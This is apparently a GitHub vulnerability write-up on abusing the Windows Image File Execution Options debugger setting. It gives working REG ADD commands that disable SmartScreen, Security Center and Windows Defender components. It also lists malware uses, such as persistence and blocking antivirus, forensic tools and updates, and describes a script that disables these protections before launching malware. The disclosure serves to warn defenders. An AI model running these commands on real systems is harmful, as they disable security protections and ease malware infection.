# Block Smartscreen and Security Center on Windows Operating Systems
&emsp; On the evening of May 29 (2022), I made the necessary notifications to the "Microsoft Security Center" [ VULN-068278].
However, according to the reply received by e-mail on June 10, "We determined that an immediate fix will not be released for the reported behavior. It was recommended to hardened because the relevant vulnerability requires **Administrator authority**. We have closed this case" .
For this reason, I wanted to warn users by posting this vulnerability or weakness in my account on Github.


&emsp; If any executable file is added to ("HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\") the regedit path and a debugger flag is set, another program can be run before that program is run. 
If the program that is run first does not invoke the relevant program in any way, it can replace the relevant program.
This can prevent various important programs from running. 
This is valid for important processes of Windows.


&emsp; For example, if you want to block Smartscreen
```
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\smartscreen.exe" /v Debugger /d "cmd.exe /C >null: 2>null:"
```


&emsp; For example, if you want to block Security Center (Windows Defender and other tools)
```
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\securityhealthhost.exe" /v Debugger /d "cmd.exe /C >null: 2>null:"
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\secHealthUI.exe" /v Debugger /d "cmd.exe /C >null: 2>null:"
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\werFault.exe" /v Debugger /d "cmd.exe /C >null: 2>null:"
```

<dl>
  <dt> The purposes of using this vulnerability can basically be listed as follows.
  <dd>
  <dd> 1) It can provide persistence for malware software.
  <dd> 2) Although it is different in function and structure, similar attacks that can be made by interfering with the system call table can also be made using this vulnerability.
  <dd> 3) Security measures such as Smartscreen, Windows Defender, etc. that come integrated with Windows can be blocked.
For example, although Windows Defender cannot be blocked directly, Windows Defender is prevented from running by preventing the components necessary for it to work.
In the example, Windows Security Center has been prevented from working, and related components have become inoperable.
  <dd> 4) In particular, third-party virus scanning and security software can be blocked.
Also, any other third-party software may be blocked from running.
  <dd> 5) Processes used for forensic purposes that are integrated with Windows can be blocked.
  <dd> 6) By blocking the components necessary for the operation of Windows, operations such as "sending error reports" and "receiving updates" can be rendered inoperable.
For example, by blocking the "calcs" command, access to certain folders and files can be prevented by preventing the user and Windows from accessing the access control list.
</dl>


Video and Screenshots of the Vulnerability
---
&emsp; A simple video has been posted on Youtube to demonstrate the vulnerability. 
It can be viewed at the link below.

&emsp; **[Youtube Link]** https://www.youtube.com/watch?v=_rQrLeDaFSU


**[ScreenShot 1]**
![e3](https://user-images.githubusercontent.com/71177413/173035204-a42ff30d-6dd0-4dde-8c53-10384db37ed2.JPG)


**[ScreenShot 2]**
![e4](https://user-images.githubusercontent.com/71177413/173035010-04fef1aa-7eac-4891-8541-5bcd57d70390.png)


**[ScreenShot 3]**
![e6](https://user-images.githubusercontent.com/71177413/173035082-fd6e2075-7c98-4786-a50a-d35db152027a.png)


Exploiting the Vulnerability
---
&emsp; As an example, a script has been written to show how a malware can exploit this vulnerability.
The **"block.py"** script has been added to the files as an example in order to represent what we call the first stage in malware attacks.

It primarily blocks Smartscreen and Windows Security from working.
In this way, Windows Defender cannot work.
Then it runs the malware


**block.py**
```
(Administrator authority)>> block.py malware.exe
```



Additional information on malwares
---
&emsp; In order to evaluate the vulnerability, basic information about malware-type attacks is given.

**A) Ideal Malware Attacks**
&emsp;

![malware_1](https://user-images.githubusercontent.com/71177413/173053242-7229231b-fad8-4716-90ee-d8572d5c74a6.JPG)
[jpg source: From the training notes, Abdulkadir GÜNGÖR]

**B) Types of Malware**
&emsp;

![malware_2_type](https://user-images.githubusercontent.com/71177413/173053253-a976a2ed-72cf-4579-b97f-0bb6d09a4093.png)
[jpg source: From the book "Linux İşletim Sisteminde Malware Analizi", Abdulkadir GÜNGÖR, ISBN:978-625-409-378-4]


**C) Final Stage**
&emsp;

![malware_3](https://user-images.githubusercontent.com/71177413/173053274-478c0e9f-67d0-4b93-b842-061c611fbde2.JPG)
[jpg source: From the training notes, Abdulkadir GÜNGÖR]


Disclaimer
---
&emsp; Information and projects published by me on Github are entirely at the user's own risk.
I'm not responsible in any way for any kind of damage that is done to your computer / os / program as cause of this project.
Make sure to use virtual systems as a test environment!


Legal Warning
---
&emsp; Run your tests on virtual machines. The responsibility for illegal use belongs to the user. Shared for educational purposes.
